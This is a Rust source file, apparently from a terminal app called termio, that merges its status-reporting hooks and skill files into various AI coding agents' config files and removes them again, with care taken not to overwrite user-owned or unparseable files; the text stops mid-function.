//! Installing termio's agent integration into the agent config files on this box.
//!
//! Two write problems wearing one Settings toggle. **A skill is a file; a hook
//! is a merge.** The skill is one whole document termio owns at
//! `<skillDir>/termio/SKILL.md`; a hook goes into a file the user also owns and
//! edits, so every rule below is about not damaging it:
//!
//! - never overwrite a config that does not parse — a file we cannot read is a
//!   file we cannot merge into, and rewriting it would discard whatever it held;
//! - never claim a file that is not ours — `termio.js` is a plausible name for a
//!   user's own plugin, and a script named after a lifecycle event is a
//!   plausible name for a user's own hook;
//! - strip the third-party writers in [`CONFLICTING_HOOK_MARKERS`] that
//!   full-replace the shared `hooks` block instead of merging into it, so the
//!   next destructive writer cannot out-merge us;
//! - write nothing when the bytes already match.
//!
//! A fifth rule only shows up on the *second* install: **it must replace what
//! the last one wrote.** Each dialect recognises its own work differently — a
//! JSON group by its command, a script and a plugin by their marker, the TOML
//! block by its banner — and every one has to hold, or a reinstall doubles the
//! hooks instead of refreshing them.
//!
//! See `docs/design/20260825-agent-integration-moves-to-termiod.md`. The
//! generated plugin sources live in [`super::plugin`].

use super::machine;
use super::manifest::{AgentCatalog, AgentDefinition, HookDialect, HookEvent, HookSpec, HookType};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::path::{Path, PathBuf};

/// The substring that identifies a *legacy* raw-socket entry as termio's — the
/// `printf … | nc -U …/agent-status.sock` hooks older builds installed, and the
/// `// Socket marker: …` comment still embedded in the plugin files.
pub const SOCKET_MARKER: &str = "agent-status.sock";

/// The substring that identifies a current CLI-based hook as termio's: every
/// hook installed for this Mac invokes the public `termio agent report <state>`
/// contract.
pub const CLI_MARKER: &str = "agent report";

/// The same role for a hook on a box, which has no `termio` and no app to report
/// to and instead names the daemon's own session id. Spelled with the
/// environment variable so it cannot match a user's own tool that happens to
/// have a `set-status` verb — without a fingerprint a reinstall appends a
/// duplicate of every entry instead of replacing it, as the SSH arm did.
pub const DAEMON_MARKER: &str = "set-status \"$TERMIOD_SESSION_ID\"";

/// Fingerprints of third-party status hooks that full-replace the shared `hooks`
/// block instead of merging, wiping termio's entries. Stripped on install so a
/// destructive writer cannot out-merge us. Each substring is specific to one
/// tool's command, so a user's own hook is never matched — extend only with
/// equally specific fingerprints.
pub const CONFLICTING_HOOK_MARKERS: [&str; 2] = ["SUPERSET_HOME_DIR", "SUPERSET_AGENT_ID"];

/// Marker + version stamped into every installed hook (`# termio-hooks v0.33.0`).
pub const HOOK_VERSION_MARKER: &str = "# termio-hooks v";

/// The Mac's skill, and a box's. They are different documents, not two spellings
/// of one: the Mac's teaches the `termio sessions` CLI and gates on
/// `TERMIO_SESSION`, and a box has neither — shipping it there would teach an
/// agent to run a binary that is not installed.
const MAC_SKILL: &str = include_str!("../../../Sources/termio/Resources/skills/termio/SKILL.md");
const DEVICE_SKILL: &str =
    include_str!("../../../Sources/termio/Resources/skills/termio-device/SKILL.md");

/// What to do with one half of the integration.
///
/// Per half, not one flag for both, because the two Integration switches are
/// independent: a user can want live status without session control. One
/// message still covers the whole roster — this is what keeps that true when
/// the switches disagree, instead of costing a second round trip.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[cfg_attr(feature = "schema", derive(schemars::JsonSchema))]
#[serde(rename_all = "snake_case")]
pub enum HalfAction {
    Install,
    /// Sweep every directory termio has ever written this half into.
    Remove,
    /// Not this caller's business — the device pane's "Reinstall hooks" must not
    /// touch the skill.
    #[default]
    Leave,
}

/// Which machine this is, for the one thing that still differs between them.
///
/// It used to be *how a hook reports* — the Mac's hooks called the app's `termio`
/// CLI into a socket the app owned, a device's called `termiod`. That split is
/// gone: every hook now reports to the daemon that owns its PTY, so there is one
/// command, one set of flags, and one ownership fingerprint. What survives is the
/// skill payload, because a Mac has a `termio` binary to teach and a box does not.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[cfg_attr(feature = "schema", derive(schemars::JsonSchema))]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Reporter {
    /// This Mac, where the app is running.
    ThisMac,
    /// A box reached over the protocol.
    Device,
}

impl Reporter {
    fn is_local(&self) -> bool {
        matches!(self, Reporter::ThisMac)
    }

    /// Which bundled skill this machine gets.
    fn skill(&self) -> &'static str {
        if self.is_local() {
            MAC_SKILL
        } else {
            DEVICE_SKILL
        }
    }
}

/// What the client asked for, plus the one thing about this box it needed
/// resolving against.
#[derive(Debug, Clone)]
pub struct InstallRequest {
    /// The ids the user has on their list, or `None` for the whole catalog.
    /// Which agents are enabled is a preference, so it stays the client's to
    /// state; where their files live is a fact about this box, so it does not.
    pub agents: Option<Vec<String>>,
    pub hooks: HalfAction,
    pub skills: HalfAction,
    pub reporter: Reporter,
    /// The version stamped into each hook command as a trailing shell comment.
    /// The command string changes between releases, so the stamp is what makes
    /// the idempotent write re-install the hook on the first launch after an
    /// upgrade.
    pub hook_version: String,
    /// The absolute binary every generated hook invokes: this daemon's own,
    /// resolved once here rather than per command. Six dialects embed it, in two
    /// escaping contexts, and they must all name the same file.
    binary: String,
}

impl InstallRequest {
    pub fn new(
        agents: Option<Vec<String>>,
        hooks: HalfAction,
        skills: HalfAction,
        reporter: Reporter,
        hook_version: String,
    ) -> InstallRequest {
        let binary = machine::daemon_binary();
        InstallRequest {
            agents,
            hooks,
            skills,
            reporter,
            hook_version,
            binary,
        }
    }

    pub(super) fn binary(&self) -> &str {
        &self.binary
    }

    pub(super) fn is_local(&self) -> bool {
        self.reporter.is_local()
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[cfg_attr(feature = "schema", derive(schemars::JsonSchema))]
#[serde(rename_all = "snake_case")]
pub enum InstallStatus {
    /// The config carries termio's current wiring — including the common case
    /// where it already did and nothing was written.
    Installed,
    /// It was left alone on purpose (unparseable, or not ours to overwrite), or
    /// the write failed. `detail` says which.
    Failed,
    /// This daemon does not install this dialect yet. Reported rather than
    /// dropped: a silent no-op is the failure mode this must not have.
    Skipped,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[cfg_attr(feature = "schema", derive(schemars::JsonSchema))]
pub struct InstallResult {
    /// The agent's id, so a client can key its own roster off the reply.
    pub id: String,
    /// The agent's display name, for the sentence a Settings row shows.
    pub name: String,
    /// `hooks` or `skill`.
    pub kind: String,
    /// Where it landed on this box, resolved — the answer the client could not
    /// work out for itself.
    pub path: String,
    pub status: InstallStatus,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub detail: Option<String>,
}

impl InstallResult {
    fn new(
        agent: &AgentDefinition,
        kind: &str,
        path: &str,
        status: InstallStatus,
        detail: Option<String>,
    ) -> InstallResult {
        InstallResult {
            id: agent.id.clone(),
            name: agent.display_name.clone(),
            kind: kind.to_string(),
            path: path.to_string(),
            status,
            detail,
        }
    }
}

/// Whether one agent's CLI is on this box.
///
/// The Mac used to answer this with one `ssh host 'command -v …'` *per agent*,
/// which is a dozen round trips to learn something the box knows about itself in
/// microseconds. It is the same login-shell probe the install already runs
/// before writing a skill, exposed so a client can ask without writing anything.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[cfg_attr(feature = "schema", derive(schemars::JsonSchema))]
pub struct AgentPresence {
    pub id: String,
    /// The command that was looked for, so a client can show what was asked.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    /// `true` also when the probe could not look — never cry wolf, the same rule
    /// the install follows.
    pub present: bool,
}

/// Answer for the named agents, or for the whole catalog.
pub fn probe(agents: Option<Vec<String>>) -> Vec<AgentPresence> {
    let catalog = AgentCatalog::load();
    let wanted: Option<HashSet<&str>> = agents
        .as_ref()
        .map(|ids| ids.iter().map(String::as_str).collect());
    catalog
        .all
        .iter()
        .filter(|agent| wanted.as_ref().map(|w| w.contains(agent.id.as_str())).unwrap_or(true))
        .map(|agent| AgentPresence {
            id: agent.id.clone(),
            command: agent.command.clone(),
            present: match agent.command.as_deref() {
                Some(command) => machine::is_command_installed(command),
                None => true,
            },
        })
        .collect()
}

/// Apply `request` against this box's filesystem.
pub fn run(request: &InstallRequest) -> Vec<InstallResult> {
    let catalog = AgentCatalog::load();
    let mut results = Vec::new();
    if request.hooks != HalfAction::Leave {
        results.extend(sync_hooks(&catalog, request));
    }
    if request.skills != HalfAction::Leave {
        results.extend(sync_skills(&catalog, request));
    }
    results
}

fn selected<'a>(catalog: &'a AgentCatalog, request: &InstallRequest) -> Vec<&'a AgentDefinition> {
    match &request.agents {
        None => catalog.all.iter().collect(),
        Some(ids) => {
            let wanted: HashSet<&str> = ids.iter().map(String::as_str).collect();
            catalog
                .all
                .iter()
                .filter(|agent| wanted.contains(agent.id.as_str()))
                .collect()
        }
    }
}

// MARK: - Hooks

fn sync_hooks(catalog: &AgentCatalog, request: &InstallRequest) -> Vec<InstallResult> {
    if request.hooks != HalfAction::Install {
        // Sweep everything termio has ever installed, bundled declarations
        // included, so a shipped hook a user override removed or redirected is
        // cleaned too.
        let mut seen: Vec<&HookSpec> = Vec::new();
        for agent in catalog.bundled.iter().chain(catalog.all.iter()) {
            let Some(spec) = agent.hooks.as_ref() else {
                continue;
            };
            if !seen.contains(&spec) {
                seen.push(spec);
                uninstall_hooks(agent, spec);
            }
        }
        return Vec::new();
    }

    // A full user override may intentionally remove or redirect a shipped hook.
    // Remove that old managed wiring before installing the merged catalog.
    for (agent, spec) in catalog.stale_bundled_hooks() {
        uninstall_hooks(&agent, &spec);
    }

    selected(catalog, request)
        .into_iter()
        .filter_map(|agent| {
            let spec = agent.hooks.as_ref()?;
            Some(install_hooks(agent, spec, request))
        })
        .collect()
}

/// Where a manifest path lands on this box, honouring the agent's own
/// config-home variable. Resolved once per agent and handed to the installers
/// already absolute, so every dialect gets the same answer and none of them has
/// to know the rule.
fn resolved(agent: &AgentDefinition, path: &str) -> std::result::Result<String, String> {
    machine::resolve(path, agent.config_home.as_ref()).map(|path| path.display().to_string())
}

fn install_hooks(
    agent: &AgentDefinition,
    spec: &HookSpec,
    request: &InstallRequest,
) -> InstallResult {
    match spec.hook_type {
        HookType::Json => {
            let Some(file) = spec.file.as_deref() else {
                return InstallResult::new(
                    agent,
                    "hooks",
                    "",
                    InstallStatus::Failed,
                    Some("incomplete JSON hook manifest".into()),
                );
            };
            let file = match resolved(agent, file) {
                Ok(file) => file,
                Err(reason) => {
                    return InstallResult::new(agent, "hooks", "", InstallStatus::Failed, Some(reason))
                }
            };
            let installer = JsonHookFile::new(&file, spec, request);
            let outcome = installer.install();
            InstallResult::new(
                agent,
                "hooks",
                &file,
                if outcome.is_ok() {
                    InstallStatus::Installed
                } else {
                    InstallStatus::Failed
                },
                outcome.err(),
            )
        }
        HookType::Scripts => {
            let Some(directory) = spec.directory.as_deref() else {
                return InstallResult::new(
                    agent,
                    "hooks",
                    "",
                    InstallStatus::Failed,
                    Some("incomplete script hook manifest".into()),
                );
            };
            let directory = match resolved(agent, directory) {
                Ok(directory) => directory,
                Err(reason) => {
                    return InstallResult::new(agent, "hooks", "", InstallStatus::Failed, Some(reason))
                }
            };
            let installer = ScriptHookDirectory::new(&directory, spec, request);
            let outcome = installer.install();
            InstallResult::new(
                agent,
                "hooks",
                &directory,
                if outcome.is_ok() {
                    InstallStatus::Installed
                } else {
                    InstallStatus::Failed
                },
                outcome.err(),
            )
        }
        HookType::Plugin => {
            let directory = match spec.directory.as_deref().map(|d| resolved(agent, d)) {
                Some(Ok(directory)) => directory,
                Some(Err(reason)) => {
                    return InstallResult::new(agent, "hooks", "", InstallStatus::Failed, Some(reason))
                }
                None => String::new(),
            };
            let installer = match PluginFile::new(&directory, spec, request) {
                Some(installer) => installer,
                None => {
                    return InstallResult::new(
                        agent,
                        "hooks",
                        "",
                        InstallStatus::Failed,
                        Some("incomplete plugin hook manifest".into()),
                    )
                }
            };
            let path = installer.path.clone();
            let outcome = installer.install();
            InstallResult::new(
                agent,
                "hooks",
                &path,
                if outcome.is_ok() {
                    InstallStatus::Installed
                } else {
                    InstallStatus::Failed
                },
                outcome.err(),
            )
        }
        HookType::Toml => {
            let Some(file) = spec.file.as_deref() else {
                return InstallResult::new(
                    agent,
                    "hooks",
                    "",
                    InstallStatus::Failed,
                    Some("incomplete TOML hook manifest".into()),
                );
            };
            let file = match resolved(agent, file) {
                Ok(file) => file,
                Err(reason) => {
                    return InstallResult::new(agent, "hooks", "", InstallStatus::Failed, Some(reason))
                }
            };
            let installer = TomlHookBlock::new(&file, spec, request);
            let outcome = installer.install();
            InstallResult::new(
                agent,
                "hooks",
                &file,
                if outcome.is_ok() {
                    InstallStatus::Installed
                } else {
                    InstallStatus::Failed
                },
                outcome.err(),
            )
        }
    }
}

/// Sweep one agent's wiring. Resolved against the *current* config home: if the
/// variable moved since the install, the old tree is left alone rather than
/// hunted for, because guessing at directories to delete in is a worse failure
/// than leaving a stale file behind.
fn uninstall_hooks(agent: &AgentDefinition, spec: &HookSpec) {
    let file = spec.file.as_deref().map(|file| resolved(agent, file));
    let directory = spec
        .directory
        .as_deref()
        .map(|directory| resolved(agent, directory));
    match (spec.hook_type, file, directory) {
        (HookType::Json, Some(Ok(file)), _) => JsonHookFile::bare(&file, spec.dialect).uninstall(),
        (HookType::Scripts, _, Some(Ok(directory))) => {
            ScriptHookDirectory::bare(&directory).uninstall()
        }
        (HookType::Plugin, _, Some(Ok(directory))) => PluginFile::bare(&directory, spec.dialect)
            .map(|installer| installer.uninstall())
            .unwrap_or(()),
        (HookType::Toml, Some(Ok(file)), _) => TomlHookBlock::bare(&file).uninstall(),
        _ => {}
    }
}

/// The stdin JSON fields the `termio` CLI mines out of an agent's hook payload.
///
/// Only the JSON-manifest dialect supplies them: it is the one whose hosts
/// verifiably always feed a hook a JSON blob on stdin, so the CLI's `cat`
/// cannot block. The script directory, the TOML block and the plugin templates
/// all take the bare command, and saying so once here is what keeps a manifest
/// that declares `capturesTranscript` on a dialect that cannot honour it from
/// quietly emitting a flag that hangs the hook.
#[derive(Default)]
pub struct StdinMining<'a> {
    captures_transcript: bool,
    conversation: Option<&'a str>,
    tool: Option<&'a str>,
    prompt_title: Option<&'a str>,
}

impl<'a> StdinMining<'a> {
    fn of(spec: &'a HookSpec) -> StdinMining<'a> {
        StdinMining {
            captures_transcript: spec.captures_transcript,
            conversation: spec.conversation.as_deref(),
            tool: spec.tool.as_deref(),
            prompt_title: spec.prompt_title.as_deref(),
        }
    }
}

/// The shell command a hook runs. Every dialect converges on it, so the
/// agent-specific knowledge ("this lifecycle event means the agent is now
/// working") is baked in at install time and nothing agent-specific runs later.
pub fn report_command(
    state: &str,
    mining: &StdinMining<'_>,
    dialect: HookDialect,
    request: &InstallRequest,
) -> String {
    let mut command = format!(
        "{} set-status \"$TERMIOD_SESSION_ID\" {state}",
        shell_quote_path(request.binary())
    );
    // The agent's stdin blob is mined by the binary the hook invokes, which is
    // the only thing that ever sees it. Each field name was validated at
    // manifest load to be a bare identifier, so it embeds safely.
    if mining.captures_transcript {
        command.push_str(" --transcript");
    }
    if let Some(field) = mining.conversation {
        command.push_str(&format!(" --conversation-from {field}"));
    }
    if let Some(field) = mining.tool {
        command.push_str(&format!(" --tool-from {field}"));
    }
    if let Some(field) = mining.prompt_title {
        command.push_str(&format!(" --prompt-title-from {field}"));
    }
    // Cursor reads the hook's stdout as its JSON reply, so the command must stay
    // silent and print a benign `{}`. `--reply` prints it even when the report
    // itself could not be delivered; the `||` fallback covers the binary not
    // being there to print anything. Claude and Codex ignore hook stdout.
    command.push_str(match dialect {
        HookDialect::CursorFlat => " --reply 2>/dev/null || printf '{}'",
        _ => " 2>/dev/null || true",
    });
    command.push_str(&format!(
        " {HOOK_VERSION_MARKER}{}",
        version_stamp(&request.hook_version)
    ));
    command
}

/// Single-quotes a path for safe embedding in a hook shell command — the CLI
/// copy can sit under `/Applications/termio dev.app`.
pub(super) fn shell_quote_path(value: &str) -> String {
    format!("'{}'", value.replace('\'', "'\\''"))
}

/// The version stamp, reduced to characters that cannot end the trailing shell
/// comment it lives in.
///
/// A newline would: the comment is the last thing on the line, so anything after
/// one is a command the agent runs on every turn. The version is client-supplied,
/// and while a client holding the token can already spawn `sh -c` through
/// `create`, a hook is *persistent* — it would keep running after the client that
/// wrote it was gone. That is a different thing to leave lying around, and one
/// `retain` closes it.
fn version_stamp(version: &str) -> String {
    let stamped: String = version
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+'))
        .take(64)
        .collect();
    if stamped.is_empty() {
        "0".to_string()
    } else {
        stamped
    }
}

/// Whether a command string is one termio installed.
fn is_ours(command: &str) -> bool {
    command.contains(CLI_MARKER) || command.contains(SOCKET_MARKER) || command.contains(DAEMON_MARKER)
}

fn is_theirs(command: &str) -> bool {
    CONFLICTING_HOOK_MARKERS
        .iter()
        .any(|marker| command.contains(marker))
}

// MARK: - The JSON-manifest dialect

/// Agents whose hooks live in a JSON file: Claude Code and Codex share the
/// nested Claude shape, Cursor a flat one with a required top-level `version`,
/// Copilot the flat shape plus a `type` on each entry.
struct JsonHookFile<'a> {
    /// The manifest's path, unexpanded, so a log line names what was declared.
    path: String,
    dialect: HookDialect,
    spec: Option<&'a HookSpec>,
    request: Option<&'a InstallRequest>,
    /// Dedicated `termio.json` files can disappear when their last managed hook
    /// is removed. Shared host files such as `settings.json` must remain.
    removes_file_when_empty: bool,
    /// Previous termio-owned filenames to strip during both install and
    /// uninstall, so a rename cannot leave the agent loading two copies.
    legacy_paths: Vec<String>,
}

impl<'a> JsonHookFile<'a> {
    fn new(path: &str, spec: &'a HookSpec, request: &'a InstallRequest) -> JsonHookFile<'a> {
        let mut file = JsonHookFile::bare(path, spec.dialect);
        file.spec = Some(spec);
        file.request = Some(request);
        file
    }

    fn bare(path: &str, dialect: HookDialect) -> JsonHookFile<'a> {
        let is_dedicated = Path::new(path)
            .file_name()
            .and_then(|name| name.to_str())
            .map(|name| name == "termio.json")
            .unwrap_or(false);
        let legacy_paths = if is_dedicated {
            let parent = Path::new(path)
                .parent()
                .map(|parent| parent.display().to_string())
                .unwrap_or_default();
            vec![format!("{parent}/termio-status.json")]
        } else {
            Vec::new()
        };
        JsonHookFile {
            path: path.to_string(),
            dialect,
            spec: None,
            request: None,
            removes_file_when_empty: is_dedicated,
            legacy_paths,
        }
    }

    fn install(&self) -> Result<(), String> {
        let (Some(spec), Some(request)) = (self.spec, self.request) else {
            return Err("nothing to install".into());
        };
        let (mut settings, expected) = match read_state(&self.path) {
            FileState::Ok(object, bytes) => (object, Some(bytes)),
            FileState::Missing(bytes) => (serde_json::Map::new(), bytes),
            FileState::Unreadable => {
                return Err(format!("refusing to modify unparseable {}", self.path))
            }
        };

        // Cursor and Copilot require a top-level schema version; add it only
        // when the user's file does not already carry one, so their choice is
        // never overwritten.
        if matches!(self.dialect, HookDialect::CursorFlat | HookDialect::CopilotFlat)
            && !settings.contains_key("version")
        {
            settings.insert("version".into(), serde_json::json!(1));
        }

        let mut hooks = match settings.get("hooks") {
            Some(serde_json::Value::Object(object)) => object.clone(),
            _ => serde_json::Map::new(),
        };
        // Strip every prior termio entry first — across all events, not just the
        // ones about to be re-added — so an event no longer managed does not
        // leave an orphan behind. Then drop the known third-party hooks that
        // full-replace the block, which makes this install authoritative.
        strip_groups(&mut hooks, &is_ours);
        strip_groups(&mut hooks, &is_theirs);

        for event in &spec.events {
            let command =
                report_command(&event.state, &StdinMining::of(spec), self.dialect, request);
            let group = match self.dialect {
                HookDialect::CursorFlat => serde_json::json!({ "command": command }),
                HookDialect::CopilotFlat => {
                    serde_json::json!({ "type": "command", "command": command })
                }
                _ => {
                    let mut nested = serde_json::Map::new();
                    nested.insert(
                        "hooks".into(),
                        serde_json::json!([{ "type": "command", "command": command }]),
                    );
                    if let Some(matcher) = &event.matcher {
                        nested.insert("matcher".into(), serde_json::json!(matcher));
                    }
                    serde_json::Value::Object(nested)
                }
            };
            match hooks.get_mut(&event.name) {
                Some(serde_json::Value::Array(groups)) => groups.push(group),
                _ => {
                    hooks.insert(event.name.clone(), serde_json::json!([group]));
                }
            }
        }
        settings.insert("hooks".into(), serde_json::Value::Object(hooks));
        write_json(&self.path, &settings, expected.as_deref())?;

        // Publish the replacement before removing its predecessor: if the new
        // file could not be written, the working legacy integration stays.
        if !machine::expand(&self.path).exists() {
            return Err(format!("{} is missing after the write", self.path));
        }
        for legacy in &self.legacy_paths {
            self.uninstall_at(legacy, true);
        }
        Ok(())
    }

    fn uninstall(&self) {
        self.uninstall_at(&self.path, self.removes_file_when_empty);
        for legacy in &self.legacy_paths {
            self.uninstall_at(legacy, true);
        }
    }

    fn uninstall_at(&self, path: &str, remove_file_when_empty: bool) {
        // Nothing to remove if the file is absent; never overwrite one we cannot
        // read.
        let FileState::Ok(mut settings, expected) = read_state(path) else {
            return;
        };
        let Some(serde_json::Value::Object(mut hooks)) = settings.get("hooks").cloned() else {
            return;
        };
        strip_groups(&mut hooks, &is_ours);
        if hooks.is_empty() {
            settings.remove("hooks");
        } else {
            settings.insert("hooks".into(), serde_json::Value::Object(hooks));
        }
        if remove_file_when_empty && settings.is_empty() {
            remove(path);
        } else if let Err(error) = write_json(path, &settings, Some(&expected)) {
            log(&error);
        }
    }
}

enum FileState {
    /// No file, or a zero-byte one — nothing to merge into either way. Carries
    /// whatever is there so the write's precondition can still name it.
    Missing(Option<Vec<u8>>),
    Unreadable,
    Ok(serde_json::Map<String, serde_json::Value>, Vec<u8>),
}

fn read_state(path: &str) -> FileState {
    let resolved = machine::expand(path);
    if !resolved.exists() {
        return FileState::Missing(None);
    }
    let Ok(bytes) = std::fs::read(&resolved) else {
        return FileState::Unreadable;
    };
    if bytes.is_empty() {
        return FileState::Missing(Some(bytes));
    }
    match super::apple_json::parse(&bytes) {
        Some(serde_json::Value::Object(object)) => FileState::Ok(object, bytes),
        _ => FileState::Unreadable,
    }
}

/// Remove the groups a predicate claims from every hook event, dropping any
/// event left with no groups. Identifying entries by their command means a
/// user's own hook is never touched.
fn strip_groups(
    hooks: &mut serde_json::Map<String, serde_json::Value>,
    claims: &dyn Fn(&str) -> bool,
) {
    let keys: Vec<String> = hooks.keys().cloned().collect();
    for key in keys {
        let Some(serde_json::Value::Array(groups)) = hooks.get(&key) else {
            continue;
        };
        let kept: Vec<serde_json::Value> = groups
            .iter()
            .filter(|group| !group_matches(group, claims))
            .cloned()
            .collect();
        if kept.len() == groups.len() {
            continue;
        }
        if kept.is_empty() {
            hooks.remove(&key);
        } else {
            hooks.insert(key, serde_json::Value::Array(kept));
        }
    }
}

/// Cursor and Copilot carry the command directly; Claude and Codex nest it.
fn group_matches(group: &serde_json::Value, claims: &dyn Fn(&str) -> bool) -> bool {
    if let Some(command) = group.get("command").and_then(|value| value.as_str()) {
        return claims(command);
    }
    let Some(inner) = group.get("hooks").and_then(|value| value.as_array()) else {
        return false;
    };
    inner.iter().any(|entry| {
        entry
            .get("command")
            .and_then(|value| value.as_str())
            .map(claims)
            .unwrap_or(false)
    })
}

fn write_json(
    path: &str,
    settings: &serde_json::Map<String, serde_json::Value>,
    expected: Option<&[u8]>,
) -> Result<(), String> {
    let data = super::apple_json::to_bytes(&serde_json::Value::Object(settings.clone()));
    // Skip a write whose bytes already match — the common case on every sync —
    // so a user-owned file sees no churn at all.
    if Some(data.as_slice()) == expected {
        return Ok(());
    }
    write_if_unchanged(path, &data, expected)
}

// MARK: - The script-directory dialect

/// Agents whose hook contract is a *directory of executables* named after the
/// lifecycle event rather than a config file to merge: Cline runs
/// `~/.cline/hooks/TaskStart` and friends, matching by filename. Each script is
/// a two-line shell wrapper around the same report contract every other dialect
/// invokes, so nothing agent-specific runs.
struct ScriptHookDirectory<'a> {
    directory: String,
    spec: Option<&'a HookSpec>,
    request: Option<&'a InstallRequest>,
}

impl<'a> ScriptHookDirectory<'a> {
    fn new(
        directory: &str,
        spec: &'a HookSpec,
        request: &'a InstallRequest,
    ) -> ScriptHookDirectory<'a> {
        ScriptHookDirectory {
            directory: directory.to_string(),
            spec: Some(spec),
            request: Some(request),
        }
    }

    fn bare(directory: &str) -> ScriptHookDirectory<'a> {
        ScriptHookDirectory {
            directory: directory.to_string(),
            spec: None,
            request: None,
        }
    }

    fn install(&self) -> Result<(), String> {
        let (Some(spec), Some(request)) = (self.spec, self.request) else {
            return Err("nothing to install".into());
        };
        let keep: HashSet<&str> = spec.events.iter().map(|e| e.name.as_str()).collect();
        self.sweep(&keep);

        let mut refused = Vec::new();
        for event in &spec.events {
            let path = format!("{}/{}", self.directory, event.name);
            let contents = self.script(event, request);
            if let Some(existing) = read_text(&path) {
                if existing != contents && !is_ours(&existing) {
                    refused.push(path);
                    continue;
                }
            }
            // Always written rather than skipped-when-identical: the agent execs
            // these by name, so the mode is as much a part of the install as the
            // bytes, and a file left non-executable by anything else is repaired
            // by re-writing it.
            if let Err(error) = write_atomically(&path, contents.as_bytes(), true) {
                refused.push(format!("{path}: {error}"));
            }
        }
        if refused.is_empty() {
            Ok(())
        } else {
            Err(format!(
                "refusing to overwrite non-termio hooks, or could not write: {}",
                refused.join(", ")
            ))
        }
    }

    fn uninstall(&self) {
        self.sweep(&HashSet::new());
    }

    /// Remove every script in the directory that is ours and not in `keep`.
    fn sweep(&self, keep: &HashSet<&str>) {
        let Ok(entries) = std::fs::read_dir(machine::expand(&self.directory)) else {
            return;
        };
        for entry in entries.filter_map(|entry| entry.ok()) {
            let Some(name) = entry.file_name().to_str().map(str::to_string) else {
                continue;
            };
            if keep.contains(name.as_str()) {
                continue;
            }
            let path = format!("{}/{name}", self.directory);
            match read_text(&path) {
                Some(existing) if is_ours(&existing) => remove(&path),
                _ => {}
            }
        }
    }

    fn script(&self, event: &HookEvent, request: &InstallRequest) -> String {
        format!(
            "#!/bin/sh\n{}\n",
            // A script directory takes the bare command: Cline hands its hooks
            // no stdin blob to mine.
            report_command(
                &event.state,
                &StdinMining::default(),
                HookDialect::ClineScripts,
                request,
            )
        )
    }
}

// MARK: - The plugin dialects

/// Agents whose integration is a single dropped-in file with no host config to
/// merge: OpenCode loads a plugin from `~/.config/opencode/plugin`, Pi an
/// extension from `~/.pi/agent/extensions`, Amp one from `~/.config/amp/plugins`.
/// The source itself is [`super::plugin`]'s; this is the ownership and the write.
///
/// `termio.js` is a name a user could plausibly have chosen, so a file at that
/// path is never claimed merely because it is in the way.
struct PluginFile {
    path: String,
    contents: String,
    /// The filename an earlier build used. Publishing the replacement and then
    /// sweeping its predecessor is what keeps a rename from leaving the agent
    /// loading two copies of the same plugin.
    legacy_paths: Vec<String>,
}

impl PluginFile {
    fn new(directory: &str, spec: &HookSpec, request: &InstallRequest) -> Option<PluginFile> {
        if directory.is_empty() {
            return None;
        }
        let (filename, legacy) = super::plugin::filenames(spec.dialect)?;
        // A device used to drop the conversation plumbing here, because
        // `SetStatus` had no field for an id. It has one now, so both machines
        // get it — this is the line where the asymmetry actually died.
        let contents =
            super::plugin::source(spec.dialect, &spec.events, spec.conversation.as_deref(), request)?;
        Some(PluginFile {
            path: format!("{directory}/{filename}"),
            contents,
            legacy_paths: vec![format!("{directory}/{legacy}")],
        })
    }

    /// The uninstall form: it needs the paths and the ownership rule, not the
    /// source, so it does not need a request to generate one from.
    fn bare(directory: &str, dialect: HookDialect) -> Option<PluginFile> {
        let (filename, legacy) = super::plugin::filenames(dialect)?;
        Some(PluginFile {
            path: format!("{directory}/{filename}"),
            contents: String::new(),
            legacy_paths: vec![format!("{directory}/{legacy}")],
        })
    }

    fn install(&self) -> Result<(), String> {
        if machine::expand(&self.path).exists() {
            match read_text(&self.path) {
                Some(existing) if existing == self.contents || is_ours(&existing) => {}
                _ => return Err(format!("refusing to overwrite non-termio plugin {}", self.path)),
            }
        }
        // Whole-file, so there is no merge to commit against: termio owns every
        // byte of it. Skipped when the bytes already match.
        if read_bytes(&self.path).as_deref() != Some(self.contents.as_bytes()) {
            write_atomically(&self.path, self.contents.as_bytes(), false)?;
        }
        // Publish the replacement before removing its predecessor.
        for legacy in &self.legacy_paths {
            self.remove_if_ours(legacy);
        }
        Ok(())
    }

    fn uninstall(&self) {
        self.remove_if_ours(&self.path);
        for legacy in &self.legacy_paths {
            self.remove_if_ours(legacy);
        }
    }

    fn remove_if_ours(&self, path: &str) {
        match read_text(path) {
            Some(existing) if is_ours(&existing) => remove(path),
            _ => {}
        }
    }
}

// MARK: - The TOML block

/// Agents that declare hooks as TOML `[[hooks]]` tables inside their main config
/// file — currently Kimi Code.
///
/// No structured merge, deliberately: TOML arrays of tables may be
/// non-contiguous, so termio appends one marker-delimited block at the end of
/// the file and strips it back out by those markers on reinstall. Only the bytes
/// between the markers are touched, which is the JSON dialect's contract without
/// needing a TOML parser.
///
/// Kimi reads a hook's exit code (0 = allow) and the shared command ends in
/// `|| true`, so its blockable events need no clean-stdout handling.
struct TomlHookBlock<'a> {
    path: String,
    spec: Option<&'a HookSpec>,
    request: Option<&'a InstallRequest>,
}

const TOML_BLOCK_BEGIN: &str = "# >>> termio agent-status hooks (managed — do not edit) >>>";
const TOML_BLOCK_END: &str = "# <<< termio agent-status hooks <<<";

impl<'a> TomlHookBlock<'a> {
    fn new(path: &str, spec: &'a HookSpec, request: &'a InstallRequest) -> TomlHookBlock<'a> {
        TomlHookBlock {
            path: path.to_string(),
            spec: Some(spec),
            request: Some(request),
        }
    }

    fn bare(path: &str) -> TomlHookBlock<'a> {
        TomlHookBlock {
            path: path.to_string(),
            spec: None,
            request: None,
        }
    }

    fn install(&self) -> Result<(), String> {
        let (Some(spec), Some(request)) = (self.spec, self.request) else {
            return Err("nothing to install".into());
        };
        // The bytes the merge is computed from. This is a user-owned file, and
        // one somebody may be editing right now.
        let expected = read_bytes(&self.path);
        let existing = expected
            .as_deref()
